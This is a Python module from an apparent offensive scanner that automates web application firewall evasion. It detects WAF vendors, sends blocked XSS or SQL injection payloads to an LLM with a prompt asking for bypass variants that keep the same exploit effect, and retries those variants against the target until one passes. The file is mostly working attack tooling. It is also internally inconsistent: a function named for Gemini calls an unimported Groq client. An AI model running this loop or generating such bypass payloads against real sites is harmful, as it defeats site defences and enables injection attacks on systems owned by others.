"""
Feature 4: AI-Powered WAF Evasion Feedback Loop
-------------------------------------------------
When a scanner payload gets blocked by a WAF (403 Forbidden, Cloudflare
challenge page, etc.), this module sends the blocked payload + WAF response
to Gemini AI and asks it to generate bypass variants. The engine then
automatically retries with the AI-generated evasion payloads.

Usage:
    from modules.waf_evasion import WAFEvasionEngine
    engine = WAFEvasionEngine(gemini_api_key)
    result = engine.evade_and_test(url, original_payload, param_name="q")
    # result = {"success": bool, "bypass_payload": str, "response": str, "attempts": int}
"""

import requests
import urllib3
import random
import json
import re
import time
from urllib.parse import urlparse, urlencode, quote

urllib3.disable_warnings()

MODELS = ["gemini-2.5-flash", "gemini-1.5-pro", "gemini-1.5-flash"]

WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-request-id", "attention required"],
    "akamai": ["akamaighost", "akamai-origin-hop", "x-akamai"],
    "aws_waf": ["x-amzn-requestid", "x-amzn-trace-id", "awswaf"],
    "imperva": ["x-cdn", "incapsula", "visid_incap", "incap_ses"],
    "sucuri": ["sucuri", "x-sucuri"],
    "modsecurity": ["mod_security", "modsecurity"],
    "f5_big_ip": ["bigip", "x-cnection", "ts="],
    "barracuda": ["barra_counter_session", "barracudawaf"],
    "fortiweb": ["fortiwafsid", "fortiweb"],
}

# Patterns indicating a WAF block
WAF_BLOCK_PATTERNS = [
    "access denied", "forbidden", "blocked", "security", "firewall",
    "waf", "attack detected", "suspicious activity", "request rejected",
    "not acceptable", "web application firewall", "bot detection",
    "challenge", "captcha", "verify you are human",
]




def _call_gemini(prompt, api_key):
    client = Groq(api_key=api_key)
    try:
        completion = client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama-3.1-8b-instant"
        )
        return completion.choices[0].message.content
    except Exception as e:
        return None


def detect_waf_vendor(response):
    """Detect which WAF vendor blocked the request based on headers/body."""
    detected = []
    all_headers = json.dumps(dict(response.headers)).lower()
    body_lower = response.text.lower()

    for waf_name, signatures in WAF_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in all_headers or sig.lower() in body_lower:
                detected.append(waf_name)
                break

    return detected if detected else ["unknown"]


def is_waf_blocked(response):
    """Determine if a response indicates a WAF block."""
    # Status code check
    if response.status_code in [403, 406, 429, 503]:
        return True

    # Content check
    body_lower = response.text.lower()
    block_count = sum(1 for p in WAF_BLOCK_PATTERNS if p in body_lower)
    if block_count >= 2:
        return True

    # Cloudflare challenge page
    if "cf-browser-verification" in body_lower or "ray id" in body_lower:
        return True

    return False


class WAFEvasionEngine:
    """
    Self-healing WAF evasion loop. When a payload is blocked, the engine:
    1. Identifies the WAF vendor
    2. Sends the blocked payload + WAF response to Gemini AI
    3. AI generates N bypass variants using encoding, fragmentation, etc.
    4. Retries each variant until one succeeds or max attempts reached
    """

    def __init__(self, api_key, max_rounds=3, payloads_per_round=5):
        """
        Args:
            api_key: Gemini API key
            max_rounds: maximum AI evasion rounds before giving up
            payloads_per_round: how many bypass variants AI generates per round
        """
        self.api_key = api_key
        self.max_rounds = max_rounds
        self.payloads_per_round = payloads_per_round
        self.evasion_history = []  # Track what worked for future reference

    def _log(self, msg):
        print(f"  [WAF Evasion] {msg}", flush=True)

    def _send_payload(self, url, payload, param_name="q", method="GET",
                      inject_location="param", headers=None):
        """Send a payload and return the response."""
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        h = headers or {"User-Agent": ua, "Accept": "*/*"}
        try:
            if inject_location == "param":
                if method.upper() == "GET":
                    target = f"{url}?{param_name}={quote(payload)}"
                    return requests.get(target, headers=h, timeout=8, verify=False, allow_redirects=False)
                else:
                    return requests.post(url, data={param_name: payload}, headers=h,
                                         timeout=8, verify=False, allow_redirects=False)
            elif inject_location == "header":
                h[param_name] = payload
                return requests.get(url, headers=h, timeout=8, verify=False, allow_redirects=False)
            elif inject_location == "path":
                target = f"{url}/{quote(payload)}"
                return requests.get(target, headers=h, timeout=8, verify=False, allow_redirects=False)
        except Exception as e:
            return None

    def _generate_bypasses(self, original_payload, waf_vendors, blocked_response_snippet,
                           vuln_type="XSS", round_num=1, previous_attempts=None):
        """Ask Gemini AI to generate WAF bypass variants."""
        prev_section = ""
        if previous_attempts:
            prev_section = f"\n\nPREVIOUS FAILED BYPASS ATTEMPTS (do NOT repeat these):\n"
            for p in previous_attempts:
                prev_section += f"  - {p}\n"

        prompt = f"""You are an expert WAF bypass researcher. A payload was blocked by a WAF.

ORIGINAL PAYLOAD: {original_payload}
WAF VENDOR(S): {', '.join(waf_vendors)}
VULNERABILITY TYPE: {vuln_type}
EVASION ROUND: {round_num}/{self.max_rounds}

BLOCKED RESPONSE (truncated):
{blocked_response_snippet[:1500]}
{prev_section}

Generate exactly {self.payloads_per_round} alternative payloads that achieve the SAME exploit effect
but use different evasion techniques. Use a MIX of these approaches:

1. **Encoding**: Double URL encoding, Unicode normalization (e.g., ＜ for <), hex encoding
2. **Case manipulation**: Mixed case, alternating case (sElEcT, ScRiPt)
3. **Fragmentation**: Comment injection (e.g., SEL/**/ECT, <scr<!---->ipt>)
4. **String concatenation**: CONCAT(), CHR(), CHAR() for SQL; String.fromCharCode for XSS
5. **HTTP Parameter Pollution**: Split payload across duplicate parameters
6. **Null bytes**: %00 injection to truncate WAF parsing
7. **Alternative syntax**: Different SQL functions, JS events (onerror, onfocus instead of onload)
8. **Protocol-level**: Chunked Transfer-Encoding, HTTP/2 specific tricks
9. **Context-specific**: If the payload lands in a JS string vs HTML attribute vs SQL LIKE clause

OUTPUT EXACTLY {self.payloads_per_round} PAYLOADS, one per line.
No explanations, no numbering, no quotes. Just the raw payloads."""

        response = _call_gemini(prompt, self.api_key)
        if not response:
            return []

        # Parse payloads — one per line, skip empty/comment lines
        payloads = []
        for line in response.strip().split("\n"):
            line = line.strip()
            # Remove leading numbers, bullets, quotes
            line = re.sub(r'^[\d]+[.\)]\s*', '', line)
            line = re.sub(r'^[-*]\s*', '', line)
            line = line.strip('"').strip("'").strip("`").strip()
            if line and len(line) > 3 and line != original_payload:
                payloads.append(line)

        return payloads[:self.payloads_per_round]

    def evade_and_test(self, url, original_payload, param_name="q",
                       method="GET", inject_location="param",
                       vuln_type="XSS", success_indicators=None):
        """
        Main evasion loop. Sends the original payload, and if blocked,
        iteratively asks AI for bypass variants until success or max rounds.

        Args:
            url: target URL
            original_payload: the blocked payload
            param_name: parameter to inject into
            method: GET or POST
            inject_location: "param" | "header" | "path"
            vuln_type: type of vulnerability (helps AI craft better bypasses)
            success_indicators: list of strings that indicate the payload executed
                                (e.g., ["<script>", "alert(", "syntax error"])

        Returns:
            dict with success status, working payload, and metadata
        """
        if not self.api_key or "your_" in self.api_key:
            return {"success": False, "reason": "No API key"}

        success_indicators = success_indicators or []
        failed_payloads = [original_payload]

        # Step 1: Test original payload
        self._log(f"Testing original payload against {urlparse(url).hostname}")
        response = self._send_payload(url, original_payload, param_name, method, inject_location)

        if response is None:
            return {"success": False, "reason": "Connection failed"}

        if not is_waf_blocked(response):
            # Original payload wasn't blocked!
            return {
                "success": True,
                "bypass_payload": original_payload,
                "attempts": 1,
                "waf_detected": False,
                "status_code": response.status_code,
            }

        # WAF detected — begin evasion loop
        waf_vendors = detect_waf_vendor(response)
        self._log(f"🛡️ WAF detected: {', '.join(waf_vendors)} — starting evasion loop")

        for round_num in range(1, self.max_rounds + 1):
            self._log(f"Round {round_num}/{self.max_rounds} — generating bypass variants...")

            bypasses = self._generate_bypasses(
                original_payload=original_payload,
                waf_vendors=waf_vendors,
                blocked_response_snippet=response.text[:2000],
                vuln_type=vuln_type,
                round_num=round_num,
                previous_attempts=failed_payloads[1:],  # Skip original
            )

            if not bypasses:
                self._log(f"AI failed to generate bypasses in round {round_num}")
                continue

            for i, bypass in enumerate(bypasses, 1):
                self._log(f"  Testing bypass {i}/{len(bypasses)}: {bypass[:60]}...")
                response = self._send_payload(url, bypass, param_name, method, inject_location)

                if response is None:
                    continue

                if not is_waf_blocked(response):
                    # Check if the payload actually executed
                    payload_executed = False
                    if success_indicators:
                        payload_executed = any(ind.lower() in response.text.lower()
                                               for ind in success_indicators)
                    else:
                        # No indicators specified — just passing the WAF is a win
                        payload_executed = response.status_code == 200

                    if payload_executed:
                        self._log(f"✅ WAF BYPASSED! Working payload: {bypass[:80]}")
                        self.evasion_history.append({
                            "waf": waf_vendors,
                            "vuln_type": vuln_type,
                            "original": original_payload,
                            "bypass": bypass,
                            "round": round_num,
                        })
                        return {
                            "success": True,
                            "bypass_payload": bypass,
                            "waf_vendors": waf_vendors,
                            "attempts": len(failed_payloads) + i,
                            "round": round_num,
                            "status_code": response.status_code,
                        }

                failed_payloads.append(bypass)
                time.sleep(0.5)  # Avoid rate limiting

        self._log(f"❌ WAF evasion failed after {self.max_rounds} rounds ({len(failed_payloads)} attempts)")
        return {
            "success": False,
            "waf_vendors": waf_vendors,
            "attempts": len(failed_payloads),
            "reason": "All bypass attempts blocked",
        }

    def get_evasion_stats(self):
        """Return statistics about successful evasions for learning."""
        return {
            "total_bypasses": len(self.evasion_history),
            "by_waf": {},
            "by_vuln_type": {},
            "history": self.evasion_history,
        }
